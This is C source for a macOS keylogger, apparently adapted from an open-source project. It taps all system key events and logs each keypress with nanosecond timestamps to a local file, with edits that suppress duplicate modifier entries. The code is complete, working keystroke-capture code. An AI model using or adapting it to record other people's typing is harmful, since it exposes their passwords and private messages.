//https://github.com/caseyscarborough/keylogger
#include "keylogger.h"

// clock code https://gist.github.com/jbenet/1087739
void current_utc_time(struct timespec *ts) {
#ifdef __MACH__ // OS X does not have clock_gettime, use clock_get_time
    clock_serv_t cclock;
    mach_timespec_t mts;
    host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &cclock);
    clock_get_time(cclock, &mts);
    mach_port_deallocate(mach_task_self(), cclock);
    ts->tv_sec = mts.tv_sec;
    ts->tv_nsec = mts.tv_nsec;
#else
    clock_gettime(CLOCK_REALTIME, ts);
#endif
}

//next variablee declared by leon do avoid some double printing of specific keys
int lastKeyCode = -2;
bool critKey = false;
bool printIt = true;

int main(int argc, const char *argv[]) {
    
    struct timespec ts;
    current_utc_time(&ts);
    
    //printf("s:  %lu\n", ts.tv_sec);
    //printf("ns: %lu\n", ts.tv_nsec);

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if(argc == 2) {
        if(strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");
    
    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    struct timespec ts;
    current_utc_time(&ts);
    // Print the human readable key to the logfile.
    // fprintf(logfile, "%s", convertKeyCode(keyCode));
    // fprintf(logfile, "%u,%s\n", (unsigned)time(NULL),convertKeyCode(keyCode));
    //here i want to print the axtual keycode to know which keys i will listen to
    // NEXT LINE CODED BY LEON TO PRINT SPECIFIC KEYS ONLY ONCE
    const char *convertedKey = convertKeyCode(keyCode);
    if(printIt){
        fprintf(logfile, "%lu,%lu,%s\n",ts.tv_sec,ts.tv_nsec,convertedKey);
    
        fflush(logfile);
    }   
    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.


const char *convertKeyCode(int keyCode) {
    if(critKey && lastKeyCode == (int) keyCode){
        lastKeyCode = -2;
        critKey = false;
        printIt = false;
        return "[no print]";
    }else{
        printIt = true;
        switch ((int) keyCode) {
            case 0:   return "a";
            case 1:   return "s";
            case 2:   return "d";
            case 3:   return "f";
            case 4:   return "h";
            case 5:   return "g";
            case 6:   return "z";
            case 7:   return "x";
            case 8:   return "c";
            case 9:   return "v";
            case 10:   return "`"; // § same is `
            case 11:  return "b";
            case 12:  return "q";
            case 13:  return "w";
            case 14:  return "e";
            case 15:  return "r";
            case 16:  return "y";
            case 17:  return "t";
            case 18:  return "1";
            case 19:  return "2";
            case 20:  return "3";
            case 21:  return "4";
            case 22:  return "6";
            case 23:  return "5";
            case 24:  return "=";
            case 25:  return "9";
            case 26:  return "7";
            case 27:  return "-";
            case 28:  return "8";
            case 29:  return "0";
            case 30:  return "]";
            case 31:  return "o";
            case 32:  return "u";
            case 33:  return "[";
            case 34:  return "i";
            case 35:  return "p";
            case 37:  return "l";
            case 38:  return "j";
            case 39:  return "'";
            case 40:  return "k";
            case 41:  return ";";
            case 42:  return "\\";
            case 43:  return ",";
            case 44:  return "/";
            case 45:  return "n";
            case 46:  return "m";
            case 47:  return ".";
            case 50:  return "`"; //twice the same, ...
            // case 65:  return "[decimal]";
            // case 67:  return "[asterisk]";
            // case 69:  return "[plus]";
            // case 71:  return "[clear]";
            // case 75:  return "[divide]";
            // case 76:  return "[enter]";
            // case 78:  return "[hyphen]";
            // case 81:  return "[equals]";
            // case 82:  return "0";
            // case 83:  return "1";
            // case 84:  return "2";
            // case 85:  return "3";
            // case 86:  return "4";
            // case 87:  return "5";
            // case 88:  return "6";
            // case 89:  return "7";
            // case 91:  return "8";
            // case 92:  return "9";
            case 36:  return "[enter]";
            case 48:  return "[tab]";
            case 49:  return "[space]";
            case 51:  return "[backspace]";
            case 53:  return "[esc]";
            case 54:  return "[cmd]";
            case 55:  return "[cmd]";
            case 56:  return "[shift]"; //why does it print this twice to the log file?
            case 57:  return "[caps]";
            case 58:  return "[alt]";
            case 59:  return "[ctrl]";
            case 60:  return "[shift]"; //why does it print this twice to the log file?
            case 61: 
                critKey = true; //all these lines are to prevent this key from being printed twice
                lastKeyCode = (int) keyCode; 
                return "[alt]";   
            // case 62:  return "[ctrl]";
            // case 63:  return "[fn]";
            // case 64:  return "[f17]";
            // case 72:  return "[volup]";
            // case 73:  return "[voldown]";
            // case 74:  return "[mute]";
            // case 79:  return "[f18]";
            // case 80:  return "[f19]";
            // case 90:  return "[f20]";
            // case 96:  return "[f5]";
            // case 97:  return "[f6]";
            // case 98:  return "[f7]";
            // case 99:  return "[f3]";
            // case 100: return "[f8]";
            // case 101: return "[f9]";
            // case 103: return "[f11]";
            // case 105: return "[f13]";
            // case 106: return "[f16]";
            // case 107: return "[f14]";
            // case 109: return "[f10]";
            // case 111: return "[f12]";
            // case 113: return "[f15]";
            // case 114: return "[help]";
            // case 115: return "[home]";
            // case 116: return "[pgup]";
            // case 117: return "[fwddel]";
            // case 118: return "[f4]";
            // case 119: return "[end]";
            // case 120: return "[f2]";
            // case 121: return "[pgdown]";
            // case 122: return "[f1]";
            case 123: return "[left]";
            case 124: return "[right]";
            case 125: return "[down]";
            case 126: return "[up]";
        }
        return "[unknown]";
    }
}
// const char *convertKeyCode(int keyCode) {
//     switch ((int) keyCode) {
//         case 0:   return "a";
//         case 1:   return "s";
//         case 2:   return "d";
//         case 3:   return "f";
//         case 4:   return "h";
//         case 5:   return "g";
//         case 6:   return "z";
//         case 7:   return "x";
//         case 8:   return "c";
//         case 9:   return "v";
//         case 11:  return "b";
//         case 12:  return "q";
//         case 13:  return "w";
//         case 14:  return "e";
//         case 15:  return "r";
//         case 16:  return "y";
//         case 17:  return "t";
//         case 18:  return "1";
//         case 19:  return "2";
//         case 20:  return "3";
//         case 21:  return "4";
//         case 22:  return "6";
//         case 23:  return "5";
//         case 24:  return "=";
//         case 25:  return "9";
//         case 26:  return "7";
//         case 27:  return "-";
//         case 28:  return "8";
//         case 29:  return "0";
//         case 30:  return "]";
//         case 31:  return "o";
//         case 32:  return "u";
//         case 33:  return "[";
//         case 34:  return "i";
//         case 35:  return "p";
//         case 37:  return "l";
//         case 38:  return "j";
//         case 39:  return "'";
//         case 40:  return "k";
//         case 41:  return ";";
//         // case 42:  return "\\";
//         case 43:  return ",";
//         case 44:  return "/";
//         case 45:  return "n";
//         case 46:  return "m";
//         case 47:  return ".";
//         case 50:  return "`";
//         // case 65:  return "[decimal]";
//         // case 67:  return "[asterisk]";
//         // case 69:  return "[plus]";
//         // case 71:  return "[clear]";
//         // case 75:  return "[divide]";
//         case 76:  return "[enter]";
//         // case 78:  return "[hyphen]";
//         // case 81:  return "[equals]";
//         case 82:  return "0";
//         case 83:  return "1";
//         case 84:  return "2";
//         case 85:  return "3";
//         case 86:  return "4";
//         case 87:  return "5";
//         case 88:  return "6";
//         case 89:  return "7";
//         case 91:  return "8";
//         case 92:  return "9";
//         case 36:  return "[return]";
//         case 48:  return "[tab]";
//         case 49:  return "[space]";
//         case 51:  return "[backspace]";
//         case 53:  return "[esc]";
//         case 55:  return "[cmd]";
//         case 56:  return "[shift]";
//         case 57:  return "[caps]";
//         case 58:  return "[option]";
//         case 59:  return "[ctrl]";
//         case 60:  return "[shift]";
//         case 61:  return "[option]";
//         case 62:  return "[ctrl]";
//         case 63:  return "[fn]";
//         case 64:  return "[f17]";
//         case 72:  return "[volup]";
//         case 73:  return "[voldown]";
//         case 74:  return "[mute]";
//         // case 79:  return "[f18]";
//         // case 80:  return "[f19]";
//         // case 90:  return "[f20]";
//         // case 96:  return "[f5]";
//         // case 97:  return "[f6]";
//         // case 98:  return "[f7]";
//         // case 99:  return "[f3]";
//         // case 100: return "[f8]";
//         // case 101: return "[f9]";
//         // case 103: return "[f11]";
//         // case 105: return "[f13]";
//         // case 106: return "[f16]";
//         // case 107: return "[f14]";
//         // case 109: return "[f10]";
//         // case 111: return "[f12]";
//         // case 113: return "[f15]";
//         case 114: return "[help]";
//         case 115: return "[home]";
//         case 116: return "[pgup]";
//         // case 117: return "[fwddel]";
//         // case 118: return "[f4]";
//         // case 119: return "[end]";
//         // case 120: return "[f2]";
//         // case 121: return "[pgdown]";
//         // case 122: return "[f1]";
//         case 123: return "[left]";
//         case 124: return "[right]";
//         case 125: return "[down]";
//         case 126: return "[up]";
//     }
//     return "[unknown]";
// }
